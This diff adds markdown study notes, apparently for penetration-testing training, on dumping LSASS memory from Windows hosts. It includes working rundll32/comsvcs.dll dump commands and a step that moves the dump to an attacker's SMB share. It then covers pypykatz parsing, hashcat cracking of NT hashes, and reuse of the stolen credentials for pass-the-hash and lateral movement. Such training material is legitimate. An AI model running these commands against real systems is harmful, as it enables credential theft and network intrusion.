@@ -1,0 +1,161 @@
+🧠 Concept Overview – Attacking LSASS
+LSASS (Local Security Authority Subsystem Service) handles:
+
+Credential caching
+
+Creating access tokens
+
+Writing to security logs
+
+Attacking LSASS = pulling creds straight from memory. 🔥
+
+Dump memory ➝ transfer file ➝ parse it offline ➝ crack NT hash
+
+🧰 Methods to Dump LSASS Memory
+🖱️ 1. GUI (Task Manager Method)
+✅ Easy, but requires RDP or GUI shell.
+
+Open Task Manager → Processes tab
+
+Right click lsass.exe → Create Dump File
+
+Saved as:
+
+pgsql
+Copy
+Edit
+C:\Users\<user>\AppData\Local\Temp\lsass.DMP
+💻 2. Command Line (rundll32 + comsvcs.dll)
+✅ Use when you only have CLI access (evil-winrm, reverse shell, etc.)
+
+🔎 Get LSASS PID:
+cmd
+Copy
+Edit
+tasklist /svc
+or
+
+powershell
+Copy
+Edit
+Get-Process lsass
+📝 Create Dump File:
+powershell
+Copy
+Edit
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
+📦 Note: Modern AVs will block this — may require AV evasion.
+
+🚚 Transfer to Attack Box
+Use smbserver.py:
+
+bash
+Copy
+Edit
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support loot /home/buck/lsass/
+Then on Windows:
+
+cmd
+Copy
+Edit
+move C:\lsass.dmp \\<your-ip>\loot
+🪬 Credential Extraction – pypykatz (Linux Mimikatz)
+bash
+Copy
+Edit
+pypykatz lsa minidump /home/buck/lsass/lsass.dmp
+Key sections from output:
+
+Section	Value
+MSV	Contains NTLM hash! 🔥
+WDIGEST	Clear-text password (if not patched)
+Kerberos	Username, domain, sometimes tickets
+DPAPI	Masterkeys to decrypt Chrome, IE, RDP saved creds
+🔓 Cracking the NT Hash
+bash
+Copy
+Edit
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+Output:
+
+bash
+Copy
+Edit
+64f12cddaa88057e06a81b54e73b949b:Password1
+Use cracked password for:
+
+RDP
+
+WinRM
+
+SMB login
+
+Pivoting (reuse across domain)
+
+🔁 Summary Workflow
+text
+Copy
+Edit
+[Got Admin Access?] 
+        ↓
+[Dump LSASS → Task Manager or Rundll32]
+        ↓
+[Transfer Dump to Kali → smbserver]
+        ↓
+[Parse w/ pypykatz → Extract NT hash]
+        ↓
+[Crack hash w/ hashcat -m 1000]
+        ↓
+[Use creds for access or lateral move]
+🧠 Key Notes:
+WDIGEST only shows cleartext on old OS versions or when enabled manually.
+
+pypykatz is lightweight, cross-platform, doesn't need to be run on victim.
+
+LSASS dumps are golden — even without cracking, NT hashes = PtH potential.
+
+🔐 Why You Need Admin First
+LSASS is a protected process. It's got:
+
+System-level permissions
+
+Credential gold mine (NT hashes, plaintext, Kerberos tickets, DPAPI keys)
+
+👉 Without admin or SYSTEM, you:
+
+❌ Can’t create memory dumps of LSASS
+
+❌ Can’t access SAM/SECURITY/SYSTEM registry hives
+
+❌ Can’t run mimikatz or rundll32-based dumping
+
+❌ Can’t touch lsass.exe with PowerShell or CMD
+
+🔓 Ways to Get Admin Access First
+Local Privilege Escalation (like you're grinding in CPTS/HTB)
+
+Service misconfigs
+
+Unquoted paths
+
+Weak permissions
+
+Kernel exploits
+
+Valid Admin Creds (cracked from SAM, RDP, SMB, Evil-WinRM)
+
+Token Impersonation (e.g., from SeImpersonate + Potato chains)
+
+Password Reuse / Stuffing after cracking one user
+
+🧨 Then You Can:
+🔸 Dump LSASS (rundll32, Task Manager)
+
+🔸 Dump SAM + SYSTEM (reg save)
+
+🔸 Use pypykatz or secretsdump.py
+
+🔸 Crack with hashcat
+
+🔸 Reuse creds or PtH to laterally move
+
